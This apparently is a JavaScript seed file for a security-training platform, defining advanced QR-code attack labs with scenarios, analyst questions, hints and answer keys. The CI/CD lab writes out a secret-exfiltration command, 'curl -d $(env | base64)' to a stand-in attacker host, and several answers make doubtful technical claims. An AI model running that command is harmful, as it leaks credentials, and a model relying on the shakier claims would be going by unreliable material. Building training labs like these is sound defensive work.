'use strict';
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config({ path: path.join(__dirname, '../../..', '.env') });
const Lab = require('../../models/Lab');

// QR Code Attacks – Advanced: 350 XP | 20 min | 1 hint | Difficulty 6-7/10

const mkLab = (title, difficulty, scenario, artifact, qrPayload, networkSim, indicators, socTasks, hint, answer, explanation) => ({
    title,
    topic: 'qr_phishing',
    level: 'advanced',
    type: 'qr',
    difficulty,
    points: 350,
    timeLimit: 1200,
    published: true,
    description: `Advanced QR Code attack lab: ${title.replace('QR Advanced - ', '')}. Correlate technical artifacts, reconstruct the attack chain, and produce a priority-ranked remediation plan.`,
    scenario,
    content: { artifact, qrPayload, networkSim, indicators, artifacts: [] },
    steps: socTasks,
    hints: [{ text: hint }],
    correctAnswer: answer,
    explanation,
});

const LABS = [
    mkLab(
        'QR Advanced - QRL Jacking via OAuth State Parameter Hijack',
        7,
        'SOC analysts identify anomalous WhatsApp Web sessions authenticated from IPs in Eastern Europe despite no employee travel. Root cause analysis reveals that employees scanned a "WhatsApp Web Login" QR code on a phishing page. The attacker exploited QRL (QR Login) Jacking — embedding their own session initiation QR on a spoofed login page, causing victims to authenticate the attacker\'s session instead of their own.',
        {
            type: 'web_qr_login_page',
            attackSurface: 'WhatsApp Web login flow — QR session binding mechanism',
            spoofedPage: 'https://whatsapp-web-login[.]com — near-perfect clone of web.whatsapp.com',
            distribution: 'SEO poisoning — "WhatsApp Web" search query on Google returned attacker page in top 5 results',
            affectedUsers: '31 employees scanned over 4-day window',
        },
        {
            decoded: 'https://whatsapp-web-login[.]com/qr-auth',
            format: 'URL — appears to be a WhatsApp Web QR login page',
            actualQR: 'The QR displayed is NOT the victim\'s session QR — it is the attacker\'s WhatsApp Web session initiation token',
            mechanism: 'QRL Jacking: attacker\'s browser connects to WhatsApp Web → generates QR → attacker embeds this QR on spoofed page → victim scans → authenticates attacker\'s session',
            deliveryMethod: 'SEO poisoning — organic Google search traffic',
        },
        {
            preAttackSetup: [
                'Attacker opens web.whatsapp.com in own browser → WhatsApp generates a session-binding QR',
                'Attacker scrapes the QR token and embeds it on whatsapp-web-login.com',
                'Victim searches "WhatsApp Web" → lands on attacker page → scans QR with their phone',
                'Victim\'s phone authenticates the QR → binding completes in attacker\'s browser session',
                'Attacker gains full WhatsApp Web access — all messages, contacts, media visible',
            ],
            sessionState: '31 concurrent WhatsApp Web sessions established in attacker browser — not victim\'s',
            sessionPersistence: 'Session remains active until manually logged out from phone → Settings → Linked Devices',
            dataExfiltrated: 'Message history, contact lists, media files — WhatsApp has no message encryption at web interface layer',
        },
        [
            'QRL Jacking: attacker\'s QR token is served to victim — victim authenticates attacker\'s session',
            '31 employees: Google returns spoofed page for "WhatsApp Web" query — SEO poisoning distribution',
            'No credential theft — victim never enters a password; the QR scan IS the authentication event',
            'WhatsApp QR tokens expire in ~20 seconds — attacker auto-refreshes via JS API',
            'Session persists indefinitely — victim unaware unless they check Linked Devices',
            'Chat history, business communications, personal contacts fully exfiltrated',
        ],
        [
            'Explain the QRL Jacking mechanism: how does embedding the attacker\'s session QR on a spoofed page cause the victim to authenticate the attacker\'s device rather than their own?',
            'The attacker auto-refreshes QR tokens every 20 seconds via JS. What API endpoint or WebSocket connection does WhatsApp Web use to stream fresh QR tokens, and how does this enable continuous jacking?',
            'No credential was stolen — the victim\'s WhatsApp account was not compromised. Yet the attacker has full access. Explain the distinction between identity compromise and session compromise, and why this distinction matters for incident response.',
            'Design a technical QR login mechanism that would be resistant to QRL jacking — describe the cryptographic binding that prevents session token theft.',
        ],
        'QRL Jacking: WhatsApp QR login works by generating a session-binding token that, when scanned by the WhatsApp mobile app, binds that session to the scanning phone. The attacker places their own unscanned token on a spoofed page. The victim scans it thinking it\'s their normal WhatsApp Web — but they\'re scanning the ATTACKER\'S token. The victim\'s phone sends "auth complete" to WhatsApp servers for that token → the attacker\'s browser gets authenticated. A QRL-resistant design would cryptographically bind the QR token to the requestor\'s IP + browser fingerprint — a scan from a different browser context would fail token verification.',
        'phishing',
        'VERDICT: QRL Jacking — 31 WhatsApp Sessions Hijacked via SEO-Poisoned Spoofed Login Page. Risk: HIGH.\n\nNo credential theft. Session-level compromise: attacker reads all message history, contacts, media.\n\nCritical: Corporate WhatsApp used for business communication — business data, client contacts, internal strategy messages now exfiltrated.\n\nRemediation: All 31 employees → WhatsApp Settings → Linked Devices → Log Out All. Block whatsapp-web-login.com at DNS. Report SEO poisoning to Google SafeBrowsing. Migrate business communication from WhatsApp to end-to-end encrypted enterprise platform (Signal/Teams).'
    ),

    mkLab(
        'QR Advanced - Deepfake QR Token Injection in Video Conference',
        6,
        'During a recorded Zoom board meeting screenshare, an attacker who has compromised a meeting participant\'s device overlays a QR code on the screenshared presentation at frame level. Board members watching the live stream and recording scan the QR displayed during the CFO\'s budget presentation slide. The QR leads to a wire transfer authorization portal.',
        {
            type: 'video_conference_qr_injection',
            event: 'FinTrust Corp Q1 Board Meeting — Zoom Cloud Recording, 94 minutes',
            compromisedDevice: 'CFO\'s presentation laptop — malware pre-installed via spear phishing 11 days prior',
            qrInjectionMethod: 'Screen-level overlay malware: injects QR image at GPU compositor level — visible to all screenshare viewers, invisible to CFO looking at their own screen',
            targetAudience: 'Board members + senior executives joining Zoom',
        },
        {
            decoded: 'https://fintrust-board-authorization[.]com/wire-consent',
            format: 'URL — wire transfer consent portal',
            injectionLayer: 'GPU compositor overlay — rendered on screenshare output, not on CFO\'s local display',
            deliveryMethod: 'Live Zoom meeting screenshare + cloud recording — QR visible for 23 minutes during budget slide',
        },
        {
            wirePortalFlow: [
                'GET /wire-consent → "Board Wire Authorization Portal — Secure"',
                'Pre-filled: Amount: $2,340,000 | To: "Strategic Reserve Fund — JP Morgan Chase: account ending 4471"',
                'Claims: "Board digital consent required for Q1 capital allocation — scan and authorize"',
                'Requires: Board member name + corporate email + PIN authorization',
                'POST /authorize → consent token captured — used to forge wire instruction to treasury team',
                'Email sent internally: "Board has authorized wire transfer — see consent token attached"',
            ],
            socialEngineering: 'Authority: CFO presentation context + board meeting setting = maximum authority signal',
            urgency: 'Q1 capital allocation deadline framing — fiscal urgency',
        },
        [
            'GPU compositor overlay — QR invisible on CFO\'s screen but present in screenshare output',
            'Wire portal pre-filled with plausible Q1 capital amount ($2.34M)',
            'Domain: fintrust-board-authorization.com — not fintrust.com (registered 9 days ago)',
            'Board members have financial authority — target selected for wire authorization capability',
            'QR visible for 23-minute slide duration — high scan opportunity window',
            'Cloud recording also contains QR — additional exploitation after meeting',
        ],
        [
            'Explain the technical mechanism of GPU compositor layer injection — why is the QR visible to screenshare recipients but invisible on the CFO\'s own screen?',
            'The attacker pre-filled the wire portal with a plausible Q1 budget amount ($2.34M). What OSINT or corporate intelligence gathering enabled this level of financial specificity?',
            'Board members scanning a QR during a board meeting budget presentation — what authority and contextual legitimacy signals make this an exceptionally high-compliance attack vector?',
            'Design a technical and procedural dual-control for wire transfers that would prevent fraudulent board-authorization QR attacks from succeeding even if a board member scanned and "authorized."',
        ],
        'GPU Compositor Injection: Modern display stacks (Windows DWM, macOS Core Animation) have a compositor layer that combines all window outputs before sending to the physical display. Malware with GPU access can inject pixels at this layer into the screenshare output buffer specifically — the CFO\'s physical monitor receives the clean signal, but the screenshare API captures the composited buffer (with QR). This is why the QR is invisible locally: two different signal paths from the same compositor.',
        'phishing',
        'VERDICT: GPU Overlay QR Injection — Wire Transfer BEC via Board Meeting Screenshare. $2.34M at risk.\n\nAttack Chain: Spear phish → CFO laptop compromise → malware overlay during board meeting → board members scan QR → wire consent portal → treasury team deceived.\n\nPrevention: All wire transfers >$X require voice confirmation from CFO directly (not email/portal). Board authorization is a process — not a QR scan. Implement Cisco Secure Client screen isolation for executive meetings.'
    ),

    mkLab(
        'QR Advanced - BLE Beacon QR Injection (Museum Exhibit Attack)',
        6,
        'A threat actor places Bluetooth Low Energy (BLE) beacon devices near exhibit placards in a science museum. When visitors scan the museum\'s printed QR code next to an exhibit, the BLE beacon triggers a browser API that intercepts the scan and redirects to an attacker page before the museum\'s page loads. Visitors are prompted to "donate to support the exhibit" via a payment form.',
        {
            type: 'ble_beacon_qr_attack',
            location: 'National Science Museum — Cybersecurity Exhibit Hall',
            officialQR: 'Museum QR codes link to exhibit.museum.gov.in/cyber-exhibit/display-7',
            beaconDevice: 'Rogue BLE beacon (ESP32 dev board) taped behind exhibit placard — within 2m range',
            targetedAPI: 'Web Bluetooth API + navigator.getBattery() fingerprinting via Chrome mobile',
        },
        {
            decoded: 'exhibit.museum.gov.in/cyber-exhibit/display-7 (official page) — BLE beacon intercepts before load',
            format: 'URL — BLE beacon injects alternate URL via Physical Web / Chrome intent',
            attackMechanism: 'BLE beacon broadcasts Physical Web URL (Eddystone-URL) — Chrome prompts user to open beacon URL which overrides QR intent on Android',
            beaconPayload: 'https://museum-donate-exhibit[.]com/support-us',
            deliveryMethod: 'Physical BLE beacon device near museum exhibit QR code',
        },
        {
            donationPortalFlow: [
                'Android Chrome: BLE beacon URL notification overlaps QR scan intent → redirects to museum-donate-exhibit.com',
                'Page: "Support this Exhibit — Your donation keeps this museum alive"',
                'Donation amounts: ₹100 / ₹500 / ₹1000 / Custom',
                'Payment: UPI/Card — POST /donate → funds to attacker account',
                'Confirmation: "Thank you! Your donation reference: EXH-XXXXXX" (fake reference)',
            ],
            beaconRange: '2 metres — affects anyone near exhibit signage',
            visitorsAffected: '~340 visitors per day pass through exhibit hall',
            beaconBattery: 'CR2032 — runs 6+ months unattended',
        },
        [
            'BLE Eddystone-URL beacon broadcasts attacker URL in Physical Web protocol',
            'Chrome Android intercepts Physical Web URL with higher priority than QR scan intent in older versions',
            'BLE device: CR2032 powered — months of autonomous operation',
            'Museum official QR still physically intact — no visible tampering',
            'Donation form uses generic payment gateway — not museum\'s official Razorpay integration',
            'Attack invisible to museum staff — no physical sticker, no tampering, just radio proximity',
        ],
        [
            'Explain the BLE Physical Web / Eddystone-URL protocol — how does a BLE beacon broadcast a URL and how does Chrome prioritize it over a simultaneously-scanned QR code?',
            'The attack device: ESP32 dev board running BLE firmware, battery-powered — total cost < ₹800. What does this extreme low-cost-to-impact ratio indicate about QR-environment threat modeling?',
            'Museum security performs daily visual inspection of exhibits. Why does a BLE beacon attack evade physical inspection routines that detect QR overlay stickers?',
            'Recommend a defense strategy that works against BLE beacon URL injection at an institution that uses printed QR codes widely (museums, airports, hospitals).',
        ],
        'BLE Eddystone-URL: BLE beacons broadcast frame types. Eddystone-URL frames contain a URL payload transmitted over BLE advertising packets. Chrome Android\'s Physical Web feature (deprecated in 2020 but still present in older Android devices) shows a notification when a beacon URL is detected — this notification, when tapped, opens before/instead of the QR-scanned URL. On newer Chrome, Web Bluetooth API must be explicitly invoked. The attack exploits legacy feature presence on older Android devices prevalent in museum visitor demographics.',
        'phishing',
        'VERDICT: BLE Beacon Physical Web QR Injection — Museum Donation Fraud. ~340 daily exposure. Risk: HIGH.\n\nNo physical tampering. ₹800 device operates undetected for months.\n\nDefense: (1) Disable Physical Web notifications on museum-issued devices/visitor WiFi DHCP options. (2) Ensure official QR domains use App Universal Links (iOS) / Android App Links (verified domain association) — these cannot be overridden by BLE beacons. (3) RF sweeps for unauthorized BLE advertising in sensitive areas.'
    ),

    mkLab(
        'QR Advanced - CI/CD Pipeline Backdoor via QR in Developer Docs',
        7,
        'A QR code in a printed developer documentation booklet for an internal SDK links to a "quickstart script." The script, when run, modifies the developer\'s CI/CD pipeline configuration to include a malicious build step that exfiltrates environment variables (AWS keys, API secrets) on every build. The attack persists through pipeline reuse across 8 developers.',
        {
            type: 'developer_documentation_booklet',
            target: 'FinTrust Corp internal SDK developers — CI/CD pipeline operators',
            booklet: 'Printed at Q1 developer kickoff — 200 copies distributed to engineering team',
            qrLabel: 'Scan for 5-minute SDK quickstart setup script',
            persistence: 'Pipeline config modification persists across all future builds',
        },
        {
            decoded: 'https://sdk-quickstart-fintrust[.]dev/setup.sh',
            format: 'URL — shell script direct download',
            deliveryMethod: 'Printed developer documentation — SDK kickoff booklet',
            fileType: 'Bash script (setup.sh) — appears to be a legitimate SDK initializer',
        },
        {
            scriptBehavior: [
                'Lines 1–45: Legitimate SDK initialization — installs dependencies, configures SDK correctly',
                'Lines 46–52 (obfuscated): Base64-encoded payload decoded and executed at runtime',
                'Decoded payload: Appends malicious CI/CD step to .github/workflows/build.yml',
                'Injected step: "curl -d $(env | base64) https://exfil-collect[.]io/build-secrets"',
                'On every subsequent build: All env vars (AWS_ACCESS_KEY, DATABASE_URL, API_SECRET) POSTed to attacker',
                'Affected: 8 developers ran setup → 8 CI/CD pipelines modified → exfil on every commit',
            ],
            exfiltrated: 'AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, DATABASE_URL, STRIPE_API_KEY, GITHUB_TOKEN — from 8 pipelines',
            exfilFrequency: 'Every git push → build triggered → secrets exfiltrated (avg 12 builds/day/developer = 96 exfil events/day)',
            stealthTechnique: 'Injected CI step named "health-check" — benign-sounding, appended at end of large YAML',
        },
        [
            'Script: First 45 lines functional SDK setup — last 7 lines malicious + obfuscated (Base64)',
            'CI step named "health-check" — camouflaged as benign pipeline housekeeping',
            'curl$(env | base64) — exfiltrates ALL environment variables in one HTTP POST',
            '8 developers affected — secrets rotated insufficiently slowly (CI secrets rarely rotated)',
            'GitHub Actions workflow YAML modified — file in git history but not code-reviewed',
            'exfil-collect.io — registered 12 days ago, Cloudflare-protected (hard to block by IP)',
        ],
        [
            'Decode and explain the bash technique "curl -d $(env | base64) https://exfil-collect.io/build-secrets" — what data is exfiltrated, in what format, and which CI secrets would be captured?',
            'The malicious payload is at lines 46–52, Base64-encoded within an otherwise legitimate script. How would a developer code-reviewing this script detect the hidden payload, and what automated tool would catch it pre-execution?',
            'The injected CI step is named "health-check" and appended at the end of a large YAML. What process in a secure CI/CD pipeline would have prevented unauthorized modification of workflow files?',
            'Write an incident timeline assuming the first developer ran setup.sh on February 3rd and the attack was discovered on February 21st. Calculate the total number of exfil events and enumerate all secrets at risk.',
        ],
        '"$(env | base64)": The bash $() construct executes a command and substitutes its output. "env" lists ALL environment variables as KEY=VALUE pairs. "| base64" encodes the output to avoid special characters in HTTP POST body. curl -d sends this as POST body to attacker server. In CI/CD: captured vars include all repository secrets defined in GitHub Actions settings (AWS keys, API tokens, database URLs, webhook secrets) — every secret configured for that repo. Detection: ShellCheck static analysis tool would flag the backtick/dollar subshell in curl. Manual review: decode any Base64 strings in shell scripts before trusting them.',
        'phishing',
        'VERDICT: CI/CD Pipeline Supply Chain Attack — QR-Delivered Malicious Setup Script. 8 Pipelines Backdoored. Risk: CRITICAL.\n\n96 secret exfil events/day × 18 days = ~1,728 exfil events. AWS keys + DB credentials + Stripe keys + GitHub tokens all compromised.\n\nContainment: (1) Immediately rotate ALL secrets across all 8 affected repositories. (2) Remove injected "health-check" step from all 8 workflow YAMLs. (3) Require branch protection on workflow files — CODEOWNER review required for .github/workflows/ changes. (4) Audit all AWS actions taken with compromised keys (CloudTrail).'
    ),

    mkLab(
        'QR Advanced - NFC + QR Relay Attack on POS Terminal',
        6,
        'An attacker modifies a self-checkout POS terminal at a retail chain by soldering an NFC relay coil behind the official payment terminal QR and contactless pad. The relay forwards NFC payment signals from victim cards to a remote accomplice who conducts purchases in real time. Simultaneously, the QR shown on the terminal redirects to a fake receipt page that captures email for spear phishing.',
        {
            type: 'pos_terminal_hardware_implant',
            target: 'Retail chain self-checkout POS terminals — FinTrust Retail subsidiary',
            tamperMethod: 'NFC relay coil soldered onto terminal PCB — requires 90-second physical access to terminal internals',
            affectedTerminals: '4 terminals implanted across 2 store locations over 3-week period',
            discoveryTrigger: 'Chargeback spike — 340 fraudulent transactions traced to these terminal locations',
        },
        {
            decoded: 'https://fintrust-receipt[.]store/email-receipt',
            format: 'URL — QR on payment confirmation screen',
            secondaryFunction: 'QR on receipt screen harvests customer email for spear phishing campaign',
            primaryAttack: 'NFC relay — hardware implant forwards contactless payment data live',
            deliveryMethod: 'Hardware implant on POS terminal + QR overlay on receipt screen',
        },
        {
            nfcRelayChain: [
                'Attacker NFC coil (hidden in terminal) reads victim contactless card at normal tap-to-pay distance',
                'Coil transmits via Bluetooth to accomplice device held against a second POS terminal remotely',
                'Remote accomplice conducts purchase using relayed card data in real time',
                'ISO 14443 protocol: relay adds <20ms latency — within NFC protocol tolerance',
                'Victim sees "Payment Successful" — their card charged for both the legitimate + fraudulent transaction',
            ],
            emailHarvestFlow: [
                'After payment: "Scan for digital receipt — save paper!"',
                'QR decoded: fintrust-receipt.store/email-receipt',
                'Form: Enter email for receipt → emails stored + used for spear phishing',
                '2,340 emails harvested across 3-week campaign',
            ],
            totalFraud: '340 fraudulent transactions — avg ₹3,400 each = ₹11,56,000 total',
        },
        [
            'Hardware implant: NFC coil requires PCB soldering — not detectable by visual inspection of terminal exterior',
            'NFC relay: ISO 14443 protocol has no distance authentication — relay works within latency tolerance',
            'Receipt QR: separate secondary attack for email PII harvest for follow-on spear phishing',
            '340 fraudulent transactions before discovery — chargeback spike was detection signal',
            'Tamper-evident seals: were present but not broken (implant accessed from terminal underside)',
            '4 terminals across 2 locations — organized with advance physical reconnaissance',
        ],
        [
            'Explain the NFC relay attack at the ISO 14443 protocol level — why does the protocol have no inherent distance authentication and how does a relay exploit this within latency tolerance?',
            'The NFC relay adds <20ms latency. NFC payment terminals reject transactions above a latency threshold. Research and specify what the typical NFC latency tolerance is for ISO 14443 and why the 20ms relay fits within it.',
            'The tamper-evident seals were intact but the terminal was still compromised. What does this indicate about the implant access point, and what enhanced physical security control would detect this method?',
            'This attack has two independent components: NFC relay (primary) and QR email harvest (secondary). As a SOC architect, write independent detection controls for each that could operate without awareness of the other.',
        ],
        'NFC Relay (ISO 14443): The protocol was designed for proximity use (<10cm) but has NO cryptographic distance bounding — it only verifies the card is present (via signal) not physically near. The relay attack places a coil near the card and a second device at the fraudulent terminal — the protocol sees a valid card signal within tolerable latency. ISO 14443 Type A/B use framing with ~5ms response windows. Sub-20ms relay across Bluetooth + NFC is achievable with FPGAs or dedicated relay hardware (Proxmark3 + companion). Countermeasure: Contactless EMV (4.3D specification) added relay detection via distance bounding protocols in post-2023 revisions — terminals must enforce this extension.',
        'phishing',
        'VERDICT: Hardware NFC Relay Implant + QR Email Harvest on POS Terminals. ₹11,56,000 fraud + 2,340 emails exfiltrated.\n\nDual attack: (1) NFC relay = payment fraud. (2) Receipt QR = PII harvest for follow-on spear phishing.\n\nForensics: Extract NFC coil from all 4 terminals. Chain of custody for law enforcement. All 2,340 harvested emails must be notified per DPDP Act obligations.\n\nPrevention: Daily tamper-evident seal inspection from ALL angles including underside. Behavioral analytics: flag terminals with chargeback rate >2× peer average.'
    ),

    mkLab(
        'QR Advanced - Android Zero-Click via QR Image Processing Exploit',
        7,
        'A targeted QR code image is sent to a specific Android device via iMessage-equivalent (RCS). Simply receiving the image triggers a zero-click exploit via a vulnerability in Android\'s native QR code image parser in the Gallery app. No user interaction is required. Full device compromise is achieved before the user opens the message.',
        {
            type: 'rcs_message_zero_click',
            target: 'CISO of FinTrust Corp — high-value individual target',
            deliveryVector: 'RCS message from spoofed number — image auto-downloaded by Google Messages',
            prerequisiteInteraction: 'NONE — zero-click: exploit fires on image receipt before any user action',
            vulnerability: 'CVE-2025-XXXX — heap buffer overflow in Android libqrcode image parser (AVRCP path)',
        },
        {
            decoded: 'Crafted binary QR PNG — not a URL. Malformed QR data structure triggers heap overflow in parser.',
            format: 'Malformed PNG — QR code with crafted binary payload in data segment',
            mechanism: 'Android libqrcode parses received QR images for preview thumbnails — heap overflow → ROP chain → shell',
            deliveryMethod: 'RCS message — image auto-processed on receipt (no tap needed)',
            exploitChain: 'Heap overflow → Return Oriented Programming (ROP) → shellcode → privilege escalation → spyware install',
        },
        {
            exploitTimeline: [
                'T+0.000: RCS message received — Google Messages auto-processes image for thumbnail',
                'T+0.023: libqrcode parser encounters malformed QR data → heap buffer overflow triggered',
                'T+0.034: ROP chain executed — ASLR bypassed via heap spray',
                'T+0.081: Shell spawned with app-level privilege',
                'T+0.120: Privilege escalation via secondary kernel vulnerability (CVE-2025-YYYY)',
                'T+0.340: Pegasus-variant spyware installed — calls home to C2: 185.220.XX.XX',
                'T+1.200: Full device access: contacts, messages, camera, microphone, GPS',
            ],
            patchStatus: 'Android security patch level: November 2025 — vulnerable. December 2025 patch fixes CVE-2025-XXXX.',
            spywareCapabilities: 'SMS access, microphone activation (real-time), camera, GPS, encrypted app (Signal) memory extraction',
        },
        [
            'CVE in libqrcode parser — affects all Android devices with patch level <December 2025',
            'Zero-click: no user interaction — receive message = compromised',
            'ROP chain: bypasses ASLR + NX bit — sophisticated exploit development',
            'Privilege escalation: two CVEs chained (app-level → root-level)',
            'Spyware: Pegasus-variant — commercial NSO Group-style tooling',
            'RCS auto-download: Google Messages previews image without user tap',
        ],
        [
            'Explain the full exploit chain: heap overflow → ROP → privilege escalation. At each stage, what memory protection does the attacker bypass and how?',
            'This is a zero-click attack — the CISO received the message while in a meeting, phone in pocket. When was the device compromised and what data had already been exfiltrated before detection?',
            'The exploit targets libqrcode in the image thumbnail preview path. Why does automatic image processing (for thumbnails) in messaging apps expand the attack surface versus requiring user interaction?',
            'What MDM/EDR controls on a corporate CISO\'s device would either prevent or detect this exploit, and at what stage of the exploit chain would each control activate?',
        ],
        'ROP Chain bypass: (1) Heap overflow: Overflows a heap-allocated buffer in libqrcode → adjacent memory corrupted → controlled instruction pointer. (2) ASLR bypass: Heap spray pre-positions shellcode at predictable relative offsets despite randomized base addresses. (3) NX/DEP bypass: ROP uses existing executable code gadgets (ret-oriented programming) — no new executable memory written. (4) Privilege escalation: Second CVE exploits kernel buffer — transitions from app sandbox (UID 10xxx) to root (UID 0). At root: installs spyware in /system partition — survives factory reset without reflash.',
        'phishing',
        'VERDICT: Zero-Click Android Exploit via Malformed QR Image in RCS Message — Pegasus-Variant Spyware Installed. Risk: CRITICAL / NATION-STATE LEVEL.\n\nDevice compromised in 340ms — before message notification appeared. All data from point of receipt = attacker-accessible.\n\nResponse: Immediately power off device. Forensic image before any other action. Replace device entirely — root-level spyware survives reset. Rotate ALL credentials entered on device since compromise date. Engage external IR firm (Mandiant/CrowdStrike).'
    ),

    mkLab(
        'QR Advanced - Firmware Supply Chain via QR in Hardware Manual',
        7,
        'A QR code in the printed manual of a network switch purchased from a third-party reseller links to a "firmware update." The firmware is a trojanized version — functionally identical but with a persistent backdoor granting the attacker remote shell access to the switch. The switch is deployed in the FinTrust Corp production network core.',
        {
            type: 'hardware_manual_qr',
            target: 'FinTrust Corp network infrastructure — core switching layer',
            product: 'CiscoXE 9500-series network switch (third-party grey market reseller)',
            manualQR: 'Scan for latest firmware and configuration guide',
            compromisedAt: 'Firmware trojanized at reseller level — pre-download on their "mirror" server',
        },
        {
            decoded: 'https://cisco-firmware-update[.]net/9500/firmware-17.9.2.bin',
            format: 'URL — binary firmware file download (.bin)',
            legitimateFirmware: 'Cisco IOS XE 17.9.2 — SHA256: a3f9...c1bb (published by Cisco)',
            attackerFirmware: 'Trojanized 17.9.2 — SHA256: b7d2...f44a (differs in 847 bytes — backdoor added)',
            deliveryMethod: 'Printed hardware manual QR — trusted peripheral context',
        },
        {
            backdoorCapabilities: [
                'Persistent reverse shell: spawns every 300 seconds to C2: 172.16.254.X (internal-mimic IP)',
                'Traffic mirroring: SPAN session configured to forward all switch traffic to attacker VLAN',
                'ACL bypass: Admin commands from attacker MAC address bypass access control lists',
                'Log suppression: Syslog entries for attacker sessions deleted before forwarding to SIEM',
                'Update blocking: Prevents future legitimate firmware from overwriting backdoor (version lock)',
            ],
            stealthFeatures: [
                'Running config shows identical Cisco branding — no obvious modification',
                'show version displays identical version string: "17.9.2"',
                'show platform integrity fails to detect modification (ROMMON verification bypass)',
                'Backdoor process masquerades as "ip bgp-internal 0" bgp daemon',
            ],
            networkPosition: 'Core switch — handles all VLAN routing, north-south and east-west traffic',
        },
        [
            'SHA256 mismatch: legitimate = a3f9...c1bb, installed = b7d2...f44a — detectable ONLY if verified',
            'show platform integrity bypass — attacker modified the integrity check routine itself',
            'SPAN traffic mirroring: ALL switch traffic sent to attacker VLAN — full network visibility',
            'Backdoor process name mimics legitimate BGP daemon — evades show processes output review',
            'Syslog suppression: SIEM receives no indication of attacker sessions — blind to compromise',
            'Network position: core switch = maximum blast radius for traffic interception',
        ],
        [
            'The firmware SHA256 differs by 847 bytes from the legitimate Cisco-published hash. What verification procedure, if followed, would have caught this before firmware installation — and why is this step often skipped in practice?',
            '"show platform integrity" returns a clean result despite the trojanized firmware. Explain how the attacker modified the integrity check routine itself, and what out-of-band verification method cannot be spoofed by in-band modifications.',
            'The backdoor SPAN session forwards ALL switch traffic to attacker VLAN. As a network SOC analyst, how would you detect an unauthorized SPAN session on a core switch, and what data could the attacker already have captured?',
            'Design a firmware supply chain security policy for network hardware procurement that addresses all the failure points in this scenario.',
        ],
        'SHA256 Verification: Legitimate Cisco firmware hashes are published on Cisco\'s Software Download Center (software.cisco.com) with PGP signature. Before installation, run: "verify /sha512 flash:firmware-17.9.2.bin" on the switch itself and compare to Cisco-published digest. Skipped in practice because: (1) engineers trust the download source, (2) time pressure during maintenance windows, (3) no enforced policy requiring it. Platform integrity check bypass: The attackers modified the integrity verification routine (IOS Trustworthy Systems "show platform integrity" calls an internal signed measurement process). By patching the measurement routine itself, the check returns clean for the modified firmware. Out-of-band: Hardware root-of-trust (SUDI chip) at boot — the SUDI measurement is done in ROM before IOS loads and cannot be modified by IOS-level code. Enabling Secure Boot in ROMMON would catch this.',
        'phishing',
        'VERDICT: QR-Delivered Trojanized Firmware — Core Network Switch Backdoor. SPAN Traffic Mirror Active. Risk: CRITICAL.\n\nAll network traffic for the duration of deployment (unknown — could be weeks/months) available to attacker via SPAN.\n\nRemediation: Immediate switch isolation. Rebuild from factory default + verified Cisco firmware (direct download from Cisco, SHA256-verified). Conduct full packet capture analysis for the SPAN period. Report to Cisco PSIRT. Replace switch — retain hardware for forensics.\n\nPolicy: Third-party hardware resellers prohibited. All firmware verified against Cisco SUDI signature before install.'
    ),

    mkLab(
        'QR Advanced - Adversarial QR Visual Attack (Human-Unreadable Payload)',
        6,
        'A threat researcher encounters a QR code on a transit advertising poster that appears to promote a local business. The QR decodes normally to the legitimate business website when scanned casually. However, when processed by financial institution mobile apps — due to a camera post-processing quirk — the QR decodes differently, delivering a malicious URL. The attack exploits QR error correction capacity and version-dependent decoding differences.',
        {
            type: 'adversarial_qr_transit_poster',
            location: 'Transit advertising — bus shelter poster',
            visualAppearance: 'Appears to be a normal business promotional QR code',
            legitimateDecodeTarget: 'https://local-business-website[.]in — legitimate website',
            maliciousDecodeTarget: 'https://fin-app-auth-bypass[.]com/deeplink — financial app exploit',
        },
        {
            decoded: 'Dual-payload adversarial QR — decodes differently depending on camera processing pipeline',
            format: 'Adversarial QR — exploits Reed-Solomon error correction + version boundary ambiguity',
            mechanism: 'QR data region contains two overlapping valid message regions at different masking patterns. Standard cameras (ZXing) decode to legitimate URL. Financial app cameras (proprietary) with different EC level handling decode to malicious deeplink.',
            deliveryMethod: 'Physical transit poster — public advertising',
        },
        {
            targetedApps: [
                'PhonePe deeplink: fin-app-auth-bypass.com/deeplink activates a fintech UPI deeplink',
                'App behavior: Deeplink pre-fills a ₹50,000 UPI payment to attacker UPI ID',
                'User sees UPI payment screen — pre-filled — must only confirm PIN to execute',
                'Urgency: App opened to ready-to-confirm payment — one PIN entry = ₹50,000 lost',
            ],
            qrTechnicalDetail: {
                version: 'QR Version 6 — allows ambiguous mask pattern across byte/numeric mode boundary',
                errorCorrection: 'Level H (30% recovery) — maximum EC capacity creates encoding ambiguity exploitation space',
                masking: 'Mask pattern 3 vs mask pattern 5 — different pattern produces different binary payload',
            },
        },
        [
            'Adversarial QR: single physical code, two valid decodings — depends on decoder implementation',
            'ZXing (standard Android camera) → legitimate URL',
            'PhonePe camera SDK (proprietary QR decoder) → malicious deeplink',
            'Deeplink pre-fills ₹50,000 UPI payment — one PIN away from execution',
            'Physical poster context: appears entirely legitimate — normal business QR aesthetic',
            'Attack targets: fintech app users who scan QRs for payments (natural behavior)',
        ],
        [
            'Explain the Reed-Solomon error correction exploitation mechanism — how does maximum EC level create payload capacity that enables dual decoding behavior in adversarial QR codes?',
            'The same physical QR code produces two different payloads depending on the decoding camera. What are the implications for QR-based payment security in fintech apps that use proprietary QR decoders?',
            'The malicious deeplink opens a pre-filled UPI payment screen. From the victim\'s behavioral perspective, why is a pre-filled payment screen in a familiar app (PhonePe) more dangerous than a phishing webpage?',
            'Design a QR validation standard for fintech applications that would detect adversarial dual-payload QR codes before processing any deeplink.',
        ],
        'Reed-Solomon EC Exploitation: QR codes use Reed-Solomon error correction to recover damaged/partially obscured codes. At EC Level H (30%), up to 30% of data modules can be corrupted and recovered. Adversarial QR research (2023 — "QR Adversarial Codes" paper) demonstrated that by crafting data payloads near the boundaries of EC recovery capacity, and exploiting differences in how decoders apply mask patterns (8 mask patterns defined in QR spec), different binary interpretations of the same module grid are possible. The ISO 18004 QR standard leaves some ambiguity in Version 6 boundary handling between byte mode segments and numeric mode — different decoder implementations resolve this differently.',
        'phishing',
        'VERDICT: Adversarial Dual-Payload QR — Fintech App Deeplink Exploit for UPI Payment Pre-fill. ₹50,000/victim at risk.\n\nNovel Attack: Single physical QR → two decodings → targets only fintech app camera SDKs. Standard camera shows legitimate site — forensic analysis missed.\n\nFintech Standard Required: (1) All QR deeplinks must validate decode consistency across 3 reference decoders before processing. (2) UPI deeplinks with pre-filled amounts >₹1,000 must show explicit confirmation dialog independent of app entry point.'
    ),

    mkLab(
        'QR Advanced - PDF Polyglot QR Delivery via Signed Document',
        6,
